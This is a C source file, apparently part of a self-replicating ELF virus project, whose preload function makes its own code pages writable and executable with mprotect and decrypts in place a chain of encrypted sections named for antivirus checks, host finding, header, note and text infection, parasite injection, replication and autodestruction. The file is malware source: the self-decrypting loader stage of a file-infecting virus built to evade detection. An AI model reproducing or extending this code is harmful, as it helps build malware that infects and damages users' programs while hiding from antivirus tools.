#include <war.h>

////////////////////////////////////////////////////////////////////////////////
/// PUBLIC FUNCTION
////////////////////////////////////////////////////////////////////////////////

void preload(void)
{
	void *base = (void *)__entry;
	size_t diff = (unsigned long)base % PAGE_SIZE;

	if (mprotect(base - diff, ((void *)__exit - (void *)__entry) + PAGE_SIZE, PROT_READ | PROT_WRITE | PROT_EXEC) < 0)
	{
		perror("mprotect");
		exit(errno);
	}

	struct s_keychain keychain = {0};

	update_keychain_right(&keychain, (char *)replicate, (void *)autodestruction - (void *)replicate);
	decrypt_right(&keychain, (char *)autodestruction, (void *)execution - (void *)autodestruction);

	update_keychain_left(&keychain, (char *)clean, (void *)replicate - (void *)clean);
	decrypt_left(&keychain, (char *)replicate, (void *)autodestruction - (void *)replicate);

	update_keychain_right(&keychain, (char *)sign, (void *)clean - (void *)sign);
	decrypt_right(&keychain, (char *)clean, (void *)replicate - (void *)clean);

	update_keychain_left(&keychain, (char *)stub, (void *)sign - (void *)stub);
	decrypt_left(&keychain, (char *)sign, (void *)clean - (void *)sign);

	update_keychain_right(&keychain, (char *)parasite, (void *)stub - (void *)parasite);
	decrypt_right(&keychain, (char *)stub, (void *)sign - (void *)stub);

	update_keychain_left(&keychain, (char *)injection, (void *)parasite - (void *)injection);
	decrypt_left(&keychain, (char *)parasite, (void *)stub - (void *)parasite);

	update_keychain_right(&keychain, (char *)header_infection, (void *)injection - (void *)header_infection);
	decrypt_right(&keychain, (char *)injection, (void *)parasite - (void *)injection);

	update_keychain_left(&keychain, (char *)note_infection, (void *)header_infection - (void *)note_infection);
	decrypt_left(&keychain, (char *)header_infection, (void *)injection - (void *)header_infection);

	update_keychain_right(&keychain, (char *)text_infection, (void *)note_infection - (void *)text_infection);
	decrypt_right(&keychain, (char *)note_infection, (void *)header_infection - (void *)note_infection);

	update_keychain_left(&keychain, (char *)criteria, (void *)text_infection - (void *)criteria);
	decrypt_left(&keychain, (char *)text_infection, (void *)note_infection - (void *)text_infection);

	update_keychain_right(&keychain, (char *)host_constructor, (void *)criteria - (void *)host_constructor);
	decrypt_right(&keychain, (char *)criteria, (void *)text_infection - (void *)criteria);

	update_keychain_left(&keychain, (char *)find_host, (void *)host_constructor - (void *)find_host);
	decrypt_left(&keychain, (char *)host_constructor, (void *)criteria - (void *)host_constructor);

	update_keychain_right(&keychain, (char *)war, (void *)find_host - (void *)war);
	decrypt_right(&keychain, (char *)find_host, (void *)host_constructor - (void *)find_host);

	update_keychain_left(&keychain, (char *)antivirus, (void *)war - (void *)antivirus);
	decrypt_left(&keychain, (char *)war, (void *)find_host - (void *)war);
}
